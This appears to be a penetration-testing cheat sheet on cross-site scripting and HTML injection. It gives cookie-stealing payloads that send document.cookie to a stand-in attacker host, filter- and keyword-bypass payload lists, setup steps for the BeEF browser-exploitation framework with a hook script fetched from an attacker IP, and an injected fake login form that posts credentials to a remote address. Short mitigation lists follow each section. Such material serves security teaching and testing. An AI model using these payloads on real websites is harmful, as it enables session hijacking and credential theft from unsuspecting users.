# HTML | XSS

## XSS

{% hint style="info" %}
Cross-Site Scripting (XSS) attacks are a type of **injection**, in which **malicious scripts** are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send **malicious code**, generally in the form of a browser side script, to a different end user.
{% endhint %}

### Types

#### **Stored XSS**&#x20;

{% hint style="info" %}
The injected script is permanently stored on the target servers, such as in a database, in a **message** forum, visitor log, **comment** **field**, etc. The victim then retrieves the malicious script from the server when it requests the stored information.
{% endhint %}

#### **Reflected XSS**&#x20;

{% hint style="info" %}
Reflected attacks are those where the injected script is **reflected** off the web server, such as in an **error message**, **search result**, or any other response that includes some or all of the input sent to the server as part of the request.&#x20;
{% endhint %}

Let’s say a web page has a search box, which displays the search text alongside the search results as follows :

`Your search results for “searchtext”:`

The web page also uses the **HTTP GET request method** to embed the user’s input data to the query string of the URL as follows:&#x20;

`https://example.com/action.php?query=searchtext`

If the search box is susceptible to a non-persistent XSS attack, a cybercriminal can send a malicious link to an unsuspecting user and exploit the vulnerability.&#x20;

This is how the script-injected link could look like:

`https://example.com/action.php?query=<script>document.location=’https://xssattacksite.com/log.php?c=’ + encodeURIComponent(document.cookie)</script>`

#### **DOM XSS**&#x20;

{% hint style="info" %}
DOM Based XSS (or as it is called in some texts, “type-0 XSS”) is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.
{% endhint %}

Let’s take the following example of a web page that utilizes JavaScript to manipulate a DOM element:

`let searchText = document.getElementById(‘searchText’).value;`\
`let resultsData = document.getElementById(‘resultsData’);`\
`resultsData.innerHTML = ‘Your search results for: ‘ + searchText;`

As you can see on the code snippet above, the value from a user input field is grabbed and appended to an element within the web page’s HTML. If an attacker can control this value, they can craft a devious value that forces their own code to be executed.

Here is an example **** :

`Your search results for: “<script>document.location=’https://xssattacksite.com/log.php?c=’ + document.cookie</script>”`

### Payloads

{% embed url="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" %}
XSS cheatsheet
{% endembed %}

{% embed url="https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt" %}
XSS payloads
{% endembed %}

**Examples**

```html
<!-- put this into a form field or search bar-->
<img src=q onError=prompt('!XSS!'); />
<script>alert("!XSS!")</script>
<script>print()</script>

<!-- encoded -->
%uff1cscript%uff1eprompt("!XSS!");%uff1c/script%uff1e&
%253Cscript%253Eprint()%253C%252Fscript%253E
%253Cimg%2520src%253Dq%2520onError%253Dalert(%2522XSS%2522)%253B%2520%252F%253E

<!-- Bypassing First Filter -->
<svg/onload=alert(1)>
<svg//////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<svg%09onload=alert(1)>
<svg onload%09=alert(1)>
<svg%09onload%20=alert(1)>
<svg onload%09%20%28%2C%3B=alert(1)>
<svg onload+0B=alert(1)>
<script>\u0061lert(1)</script>
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
<img src=x onerror="\u0061lert"/>
<img src=x onerror="eval('\141lert(1)')"/>
<img src=x onerror="eval('\x61lert(1)')"/>

 <!-- Javascript Keyword is blocked-->
<object data="JaVaScRiPt:alert(1)">
<object data="javascript&colon;alert(1)">
<object data="java  
    script:alert(1)">
<object data="javascript&#x003A;alert(1)">
<object data="javascript&#58;alert(1)">
<object data="&#x6A;avascript;alert(1)">
<object data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;74;&#x3A;alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

```

### N.B.

#### ~~alert()~~ print()

Use **print** instead of alert

{% embed url="https://portswigger.net/research/alert-is-dead-long-live-print" %}

### Beef

#### Install & Config

```bash
git clone https://github.com/beefproject/beef.git
./install
nano config.yaml # change username and password
./beef
```

#### Control

```html
<!-- insert this into xss vulnerable field : -->
<script src="http://ip_hacker:3000/hook.js"></script>

<!-- use waf bypass -->
```

### Mitigations

* Developers should implement a **whitelist** of allowable inputs, and if not possible then there should be some input validations and the data entered by the user must be filtered as much as possible.
* Output **encoding** is the most reliable solution to combat XSS i.e. it takes up the script code and thus converts it into the plain text.
* A **WAF** _(Web Application Firewall)_ should be implemented as it somewhere protects the application from XSS attacks.
* Use of **HTTPOnly Flags** on the **Cookies**.
* The developers can use **Content Security Policy (CSP)** to reduce the severity of any XSS vulnerabilities.

## HTML Injection

### Check

* **Form fields**
  * Exploit with _BurpSuite_ using URL Encode

### Payloads

```html
<!-- URL ENCODE THESE & put them in a form field -->
<b>test</b>
<a href="https://google.com">test</a>
<img src= "https://www.ignitetechnologies.in/img/logo-blue-white.png">

<!-- add a form field to website -->
<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index:1000; background-color:white; padding:1em;">Please login with valid 
credentials:<br><form name="login" action="http://192.168.0.7:4444/login.htm">
<table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td>
<td><input type="text" name="password"/></td></tr><tr>
<td colspan=2 align=center><input type="submit" value="Login"/></td></tr>
</table></form>
```

### Mitigations

* The developer should set up his HTML script which filters the meta-characters from user inputs.
* The developer should implement functions to validate the user inputs such that they do not contain any specific tag that can lead to **virtual defacement.**
